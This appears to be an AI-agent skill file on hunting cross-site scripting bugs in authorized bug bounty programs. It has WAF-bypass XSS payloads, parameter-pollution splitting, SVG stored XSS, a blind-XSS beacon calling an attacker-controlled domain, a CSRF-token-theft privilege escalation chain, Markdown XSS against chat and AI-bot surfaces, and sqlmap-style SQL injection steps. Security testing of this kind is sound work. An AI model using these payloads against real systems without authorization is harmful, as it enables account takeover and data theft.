---
name: bb-intel-xss-chains
description: >-
  Distilled XSS hunting methodology from real bug bounty writeups — reflected/stored/blind XSS discovery, filter and WAF bypass payload construction, HPP splitting, SVG-upload stored XSS, and XSS-to-ATO chains via CSRF-token theft. Use when hunting XSS on an authorized bug bounty target, when a WAF blocks naive payloads, when a web app is hardened but a mobile/API client exists, when an upload accepts SVG, or when a stored XSS fires in a privileged user's session.
---

# bb-intel-xss-chains

## Purpose and scope

Teaches a field-tested XSS workflow: fast reflected-XSS triage, manual filter fingerprinting, WAF/signature bypass payload construction, parameter-pollution splitting on ASP.NET, blind-XSS pivots through mobile/API clients, stored XSS via SVG upload, and chaining stored XSS to account takeover via CSRF-token theft.

Non-goals: not a CSRF or open-redirect guide (the source batch contained none beyond the token-theft chain); CSP-bypass and DOM-XSS evidence is thin in the source material; not a generic scanner config reference.

## Preconditions

- Target is in-scope for an authorized bug bounty program. Never run beacons, callbacks, or chains against out-of-scope hosts.
- XSS Hunter / BXSS callback domain you control is set up before testing blind XSS.
- Two attacker-controlled accounts available for stored-XSS cross-user proof.

## Decision tree

- New target, many GET params, want breadth fast → Technique 1 (automated pipeline).
- Param reflects in HTML but naive payload blocked/encoded → Technique 2 (fingerprint) then Technique 3 (bypass payloads).
- Backend is ASP.NET behind a signature WAF, input lands in a JS string → Technique 4 (HPP splitting).
- Web input fully filtered but a mobile app or API client shares the data store → Technique 5 (blind XSS pivot).
- Upload/attachment feature accepts SVG or renders files inline → Technique 6 (SVG stored XSS).
- Stored XSS fires in a privileged viewer's session → Technique 7 (CSRF-token theft → privesc).
- Chat widget / AI assistant renders Markdown → Technique 9 (Markdown-rendering XSS).
- Default IIS/Apache page on a subdomain → Technique 10 (hidden endpoint → SQLi bonus).

## Techniques

### 1. Automated reflected-XSS pipeline

Signal: any new web target with GET parameters; breadth-first hunting.

1. `echo example.com | gau`
2. `| gf xss`
3. `| uro`
4. `| Gxss | kxss | tee xss_output.txt`
5. Confirm candidates: `dalfox file xss_output.txt` or manually in browser.

Verify: kxss shows which of `` < > ' " `` reflect unencoded; confirm with benign marker then an `alert`/`confirm` PoC.
Failure recovery: zero candidates → fall back to Technique 2 manual probing on any parameter seen in HTML.

### 2. Manual reflection probing and filter fingerprinting

Signal: parameter reflected in HTML (check `view-source:`, not DevTools DOM — the live DOM hides server-side encoding).

1. Submit a unique string, then `string'"><` and diff the reflection in view-source.
2. Fingerprint the filter in ~6 requests: `<h2>` vs `<script>` (dangerous-tag-only blocklist?), `<script src=//x` (complete-tag requirement?), `</script/x>` (trailing-slash break), `<<h2>>` (outer-char stripping leaves `<h2>`), `<IFRAME>` (case sensitivity), `onxss=` vs `onerror=` (known-handler-only blocklist?).
3. Adapt payload to what survives (Technique 3).

Verify: rendered reflection plus dialog popup or DOM change.
Failure recovery: everything encoded → try entity/double-URL encoding from Technique 3; if even `<i>` blocked, pivot to Technique 5.

### 3. Filter/WAF bypass payload construction

Signal: reflection confirmed but naive payloads blocked or entity-encoded.

1. Case + fake-handler trick: `<Img Src=OnXSS OnError=confirm(document.cookie)>` — `OnXSS` isn't a real handler so signatures miss it; the browser falls back to `onerror`.
2. Encoding: if the server decodes then renders, send double-URL-encoded `%253Cscript%253E` or HTML-entity-encoded `%26lt%3Bscript%26gt%3B`.
3. Attribute context without `<`: `"onmouseover=alert(0)` after breaking out of the quote; whitespace-encode handler names: `on%0dmouseover=` (`%0d`, `%09`, `%0C`, `%00`).
4. No-parens execution: `<script>onerror=alert;throw 1</script>`, `` alert`1` ``, `location='javascript:alert\x281\x29'`, `'-prompt(1)-'` in JS-string contexts (PortSwigger cheat sheet is the canonical library).
5. Tagless contexts: `<svg onload=alert(1)` (no `>`), `<svg><animate onbegin=alert(1) attributeName=x dur=1s>`.

Verify: dialog fires on the vulnerable origin — prefer `confirm(document.domain)` over `alert(1)` for reports.
Failure recovery: swap `alert`→`confirm`/`prompt`; try escape-sequence differential `\\\';alert(1);//`; if still blocked, try Technique 4 (ASP.NET) or 5.

### 4. HPP WAF bypass for JS-string-context XSS (ASP.NET)

Signal: ASP.NET/classic ASP/Node backend behind a signature WAF; input reflected inside a JS string (`var x = 'INPUT';`).

1. Confirm framework concatenates duplicate params with commas: `q=a&q=b` → `a,b`.
2. Split JS across duplicate params so no single value matches a signature: `?q=1'&q=alert(1)&q='2` → server builds `'1',alert(1),'2'` (valid JS via comma operator).
3. Obfuscate per-parameter: `q=1'+1;let+asd=window&q=def='al'+'ert'+;asd[def](1&q=2);'` or use `%0a` instead of `;` for a new statement.

Verify: rendered concatenated string in view-source, then dialog in browser.
Failure recovery: ML-based WAFs (Cloud Armor, Azure DRS 2.1, open-appsec) block most manual payloads — try the escape-parsing differential `test\\\';alert(1);//` or Technique 5.

### 5. Blind XSS via alternate platform (mobile/API backend)

Signal: web app WAF-hardened (even `<i>` blocked) but a mobile app or API client hits the same data store.

1. Register in the mobile app; proxy its traffic; note fields the WAF doesn't cover.
2. Identify fields staff likely review: comments, support tickets, profile names, order notes, user-agent.
3. Submit beacon payloads: `"><script src=https://your-bxss-domain></script>`.
4. Wait for callbacks; record execution origin/URL — admin-panel execution is critical.

Verify: callback ping plus screenshot of execution context.
Failure recovery: no callback after days → seed more field types (username, UA header); confirm the callback domain isn't blocked by CSP.

### 6. Stored XSS via SVG file upload

Signal: upload/attachment feature (comments, tickets, avatars) accepting SVG or not forcing `Content-Disposition: attachment`.

1. Build PoC: SVG containing `<script>alert(document.domain)</script>` inside `<svg xmlns="http://www.w3.org/2000/svg">`.
2. Upload via the normal feature; confirm no validation/sanitization.
3. Open the file URL — check it renders inline (often a redirect from the app's download endpoint to a CDN). Inline `image/svg+xml` render = execution.
4. Prove cross-user impact with a second account (distinguishes stored XSS from self-XSS).

Verify: script fires for the second user opening the attachment.
Failure recovery: file served as attachment → try filename/content-type confusion, or an HTML file if the filter is extension-only.

### 7. Stored XSS → CSRF-token theft → privilege escalation

Signal: stored XSS in a workflow field a privileged user must view (e.g., employee content reviewed by a manager).

1. Plant stored XSS in the reviewed field.
2. Host JS that reads the victim's CSRF token from the DOM/meta tag and replays the app's own role-change request (e.g., PUT to the membership endpoint promoting attacker Employee → Manager).
3. Deliver via `<script src=...>` in the stored field; wait for the privileged viewer.
4. Re-test with the new role; look for further escalation and data endpoints.

Verify: demonstrate the role change on your own attacker account (before/after screenshots) — never touch real admin data.
Failure recovery: token bound per-request → fetch the form first, parse the fresh token, then replay; if the field has a character limit, split `<script>/*` / `*/alert(0)/*` / `*/</script>` across multiple accounts' fields so combined render is valid JS.

### 8. VPN/edge-device reflected XSS with Shodan recon

Signal: wildcard-scope program including PAN-OS GlobalProtect or similar appliances.

1. Shodan dorks: `os:"PAN-OS" ssl.cert.subject.CN:"target.com"` / `hostname:"target.com" os:"PAN-OS"`.
2. Hit `/ssl-vpn/getconfig.esp` with `user=` containing URL-encoded `<svg xmlns="..."><script>prompt("XSS")</script></svg>`.

Verify: dialog on the appliance origin plus screenshot.
Failure recovery: endpoint patched/404 → fingerprint the appliance version and check for sibling endpoints.

### 9. Markdown-rendering XSS in chat/AI-bot surfaces

Signal: chat widgets or AI assistants rendering user/bot text as Markdown.

1. Feed crafted prompts containing Markdown image syntax pointing at attacker URLs or broken images with event handlers.
2. Test whether the renderer sanitizes the HTML: `![x](url "title")`, nested HTML in alt text.

Verify: rendered DOM contains an unsanitized handler/attribute → dialog in the chat surface.
Failure recovery: renderer sanitizes HTML → probe for raw-HTML passthrough or link-protocol (`javascript:`) gaps.

### 10. Bonus: default vendor page → hidden endpoint → SQLi

Signal: default IIS/Apache page on a subdomain (forgotten infrastructure).

1. Fuzz with IIS wordlist: `ffuf -u "https://t/FUZZ" -ac -fs 0 -w iis.txt`.
2. Fuzz extensions per word: `xml dll svc zip 7z htm html json js aspx asmx ashx debug` (bash loop).
3. Read found files (`build.xml` leaks endpoints/DLL paths); mine them for endpoints even if reported only as informative.
4. Replay old Burp-history requests; single-quote every parameter → error-based SQLi; confirm time-based; exploit with Ghauri (XOR payloads) or sqlmap.
5. Cross-reference: link the SQLi to the earlier "informative" info-leak report to get it reopened and re-rated.

Verify: error/time-based SQLi confirmation on one parameter.
Failure recovery: no files found → try IIS short-name scanner, then move on.

## Safety and authorization

- Authorized in-scope targets only; blind-XSS beacons and callbacks count as exploitation — confirm scope first.
- PoCs must be non-destructive: `confirm(document.domain)` dialogs, callbacks to your own domain, role changes only on your own accounts.
- No data exfiltration beyond proof: capture your own session/token or a screenshot of execution context, never other users' data.
- Escalate impact (session/token capture, data endpoints) only as far as program rules allow; stop at proof.
- When linking findings across reports, disclose the relationship rather than re-testing on production data.

## Source notes

Full case index, bounty figures, per-case URLs, and coverage gaps (thin CSP-bypass/DOM-XSS evidence, no true CSRF or open-redirect cases) are in `references/writeup-cases.md`.
